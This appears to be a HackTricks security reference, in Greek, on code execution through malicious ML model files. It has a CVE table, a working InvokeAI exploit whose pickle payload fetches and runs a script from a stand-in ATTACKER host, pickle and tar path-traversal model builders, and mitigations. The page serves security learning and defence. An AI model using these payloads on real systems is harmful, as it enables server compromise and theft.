# Μοντέλα RCE

{{#include ../banners/hacktricks-training.md}}

## Φόρτωση μοντέλων σε RCE

Τα μοντέλα Μηχανικής Μάθησης συνήθως μοιράζονται σε διάφορες μορφές, όπως ONNX, TensorFlow, PyTorch, κ.λπ. Αυτά τα μοντέλα μπορούν να φορτωθούν σε μηχανές προγραμματιστών ή σε συστήματα παραγωγής για χρήση. Συνήθως, τα μοντέλα δεν θα πρέπει να περιέχουν κακόβουλο κώδικα, αλλά υπάρχουν περιπτώσεις όπου το μοντέλο μπορεί να χρησιμοποιηθεί για την εκτέλεση αυθαίρετου κώδικα στο σύστημα είτε ως προγραμματισμένη δυνατότητα είτε λόγω ευπάθειας στη βιβλιοθήκη φόρτωσης μοντέλων.

Κατά τη στιγμή της συγγραφής, αυτά είναι μερικά παραδείγματα αυτού του τύπου ευπαθειών:

| **Framework / Tool**        | **Ευπάθεια (CVE αν είναι διαθέσιμη)**                                                    | **RCE Vector**                                                                                                                           | **Αναφορές**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Ανασφαλής αποδοχή δεδομένων στο* `torch.load` **(CVE-2025-32434)**                                                              | Κακόβουλο pickle στο checkpoint του μοντέλου οδηγεί σε εκτέλεση κώδικα (παρακάμπτοντας την προστασία `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + κακόβουλη λήψη μοντέλου προκαλεί εκτέλεση κώδικα; RCE αποδοχής δεδομένων Java στο API διαχείρισης                                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (μη ασφαλές YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Φόρτωση μοντέλου από YAML χρησιμοποιεί `yaml.unsafe_load` (εκτέλεση κώδικα) <br> Φόρτωση μοντέλου με **Lambda** layer εκτελεί αυθαίρετο Python κώδικα          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (ανάλυση TFLite)                                                                                          | Κατασκευασμένο μοντέλο `.tflite` προκαλεί υπερχείλιση ακέραιου → διαφθορά σωρού (πιθανή RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Φόρτωση ενός μοντέλου μέσω `joblib.load` εκτελεί pickle με το payload `__reduce__` του επιτιθέμενου                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (μη ασφαλές `np.load`) *αμφισβητούμενο*                                                                              | Η προεπιλεγμένη επιλογή του `numpy.load` επέτρεπε pickled object arrays – κακόβουλο `.npy/.npz` προκαλεί εκτέλεση κώδικα                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Η εξωτερική διαδρομή βαρών του μοντέλου ONNX μπορεί να ξεφύγει από τον κατάλογο (ανάγνωση αυθαίρετων αρχείων) <br> Κακόβουλο μοντέλο ONNX tar μπορεί να αντικαταστήσει αυθαίρετα αρχεία (οδηγώντας σε RCE) | |
| ONNX Runtime (σχεδιαστικός κίνδυνος)  | *(Δεν υπάρχει CVE)* ONNX custom ops / control flow                                                                                    | Μοντέλο με custom operator απαιτεί φόρτωση του native code του επιτιθέμενου; πολύπλοκα γραφήματα μοντέλων εκμεταλλεύονται τη λογική για να εκτελέσουν μη προγραμματισμένους υπολογισμούς   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Η χρήση του API φόρτωσης μοντέλου με ενεργοποιημένο `--model-control` επιτρέπει σχετική διαδρομή για την εγγραφή αρχείων (π.χ., αντικατάσταση του `.bashrc` για RCE)    | |
| **GGML (μορφή GGUF)**      | **CVE-2024-25664 … 25668** (πολλαπλές υπερχείλιες σωρού)                                                                         | Κακοσχηματισμένο αρχείο μοντέλου GGUF προκαλεί υπερχείλιση buffer σωρού στον αναλυτή, επιτρέποντας την εκτέλεση αυθαίρετου κώδικα στο σύστημα του θύματος                     | |
| **Keras (παλαιότερες μορφές)**   | *(Δεν υπάρχει νέα CVE)* Κληρονομημένο μοντέλο Keras H5                                                                                         | Κακόβουλο μοντέλο HDF5 (`.h5`) με κώδικα Lambda layer εκτελείται ακόμα κατά τη φόρτωση (η λειτουργία ασφαλείας Keras δεν καλύπτει την παλιά μορφή – “επίθεση υποβάθμισης”) | |
| **Άλλα** (γενικά)        | *Σφάλμα σχεδίασης* – Σειριοποίηση Pickle                                                                                         | Πολλά εργαλεία ML (π.χ., μορφές μοντέλων βασισμένες σε pickle, Python `pickle.load`) θα εκτελέσουν αυθαίρετο κώδικα ενσωματωμένο σε αρχεία μοντέλων εκτός αν μετριαστούν | |

Επιπλέον, υπάρχουν κάποια μοντέλα βασισμένα σε python pickle, όπως αυτά που χρησιμοποιούνται από [PyTorch](https://github.com/pytorch/pytorch/security), που μπορούν να χρησιμοποιηθούν για την εκτέλεση αυθαίρετου κώδικα στο σύστημα αν δεν φορτωθούν με `weights_only=True`. Έτσι, οποιοδήποτε μοντέλο βασισμένο σε pickle μπορεί να είναι ιδιαίτερα ευάλωτο σε αυτού του τύπου επιθέσεις, ακόμη και αν δεν αναφέρονται στον πίνακα παραπάνω.

### 🆕  InvokeAI RCE μέσω `torch.load` (CVE-2024-12029)

`InvokeAI` είναι μια δημοφιλής ανοιχτού κώδικα διαδικτυακή διεπαφή για το Stable-Diffusion. Οι εκδόσεις **5.3.1 – 5.4.2** εκθέτουν το REST endpoint `/api/v2/models/install` που επιτρέπει στους χρήστες να κατεβάζουν και να φορτώνουν μοντέλα από αυθαίρετες διευθύνσεις URL.

Εσωτερικά, το endpoint τελικά καλεί:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Όταν το παρεχόμενο αρχείο είναι ένα **PyTorch checkpoint (`*.ckpt`)**, το `torch.load` εκτελεί μια **αποσυμπίεση pickle**. Επειδή το περιεχόμενο προέρχεται απευθείας από τη διεύθυνση URL που ελέγχεται από τον χρήστη, ένας επιτιθέμενος μπορεί να ενσωματώσει ένα κακόβουλο αντικείμενο με μια προσαρμοσμένη μέθοδο `__reduce__` μέσα στο checkpoint; η μέθοδος εκτελείται **κατά τη διάρκεια της αποσυμπίεσης**, οδηγώντας σε **απομακρυσμένη εκτέλεση κώδικα (RCE)** στον διακομιστή InvokeAI.

Η ευπάθεια έχει ανατεθεί **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Διαδικασία εκμετάλλευσης

1. Δημιουργήστε ένα κακόβουλο checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Φιλοξενήστε το `payload.ckpt` σε έναν HTTP διακομιστή που ελέγχετε (π.χ. `http://ATTACKER/payload.ckpt`).
3. Ενεργοποιήστε το ευάλωτο endpoint (δεν απαιτείται αυθεντικοποίηση):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Όταν το InvokeAI κατεβάζει το αρχείο καλεί το `torch.load()` → η συσκευή `os.system` εκτελείται και ο επιτιθέμενος αποκτά εκτέλεση κώδικα στο πλαίσιο της διαδικασίας InvokeAI.

Έτοιμο exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` αυτοματοποιεί όλη τη ροή.

#### Συνθήκες

•  InvokeAI 5.3.1-5.4.2 (σημαία σάρωσης προεπιλογή **false**)
•  `/api/v2/models/install` προσβάσιμο από τον επιτιθέμενο
•  Η διαδικασία έχει δικαιώματα να εκτελεί εντολές shell

#### Μετριασμοί

* Αναβάθμιση σε **InvokeAI ≥ 5.4.3** – το patch ορίζει `scan=True` ως προεπιλογή και εκτελεί σάρωση κακόβουλου λογισμικού πριν από την αποσειριοποίηση.
* Όταν φορτώνετε σημεία ελέγχου προγραμματισμένα, χρησιμοποιήστε `torch.load(file, weights_only=True)` ή τον νέο [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) βοηθό.
* Επιβάλλετε λίστες επιτρεπόμενων / υπογραφές για πηγές μοντέλων και εκτελέστε την υπηρεσία με ελάχιστα δικαιώματα.

> ⚠️ Θυμηθείτε ότι **οποιαδήποτε** μορφή βασισμένη σε Python pickle (συμπεριλαμβανομένων πολλών αρχείων `.pt`, `.pkl`, `.ckpt`, `.pth`) είναι εγγενώς ανασφαλής για αποσειριοποίηση από μη αξιόπιστες πηγές.

---

Παράδειγμα ad-hoc μετριασμού αν πρέπει να διατηρήσετε παλαιότερες εκδόσεις του InvokeAI σε λειτουργία πίσω από έναν αντίστροφο διακομιστή μεσολάβησης:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Παράδειγμα – δημιουργία ενός κακόβουλου μοντέλου PyTorch

- Δημιουργήστε το μοντέλο:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Φορτώστε το μοντέλο:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Μοντέλα για Διαδρομή Πλοήγησης

Όπως αναφέρεται σε [**αυτή την ανάρτηση ιστολογίου**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), οι περισσότεροι μορφές μοντέλων που χρησιμοποιούνται από διάφορα AI frameworks βασίζονται σε αρχεία, συνήθως `.zip`. Επομένως, μπορεί να είναι δυνατό να καταχραστείτε αυτές τις μορφές για να εκτελέσετε επιθέσεις διαδρομής πλοήγησης, επιτρέποντας την ανάγνωση αυθαίρετων αρχείων από το σύστημα όπου φορτώνεται το μοντέλο.

Για παράδειγμα, με τον παρακάτω κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργεί ένα αρχείο στον κατάλογο `/tmp` όταν φορτωθεί:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ή, με τον παρακάτω κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργεί ένα symlink στον κατάλογο `/tmp` όταν φορτωθεί:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Αναφορές

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
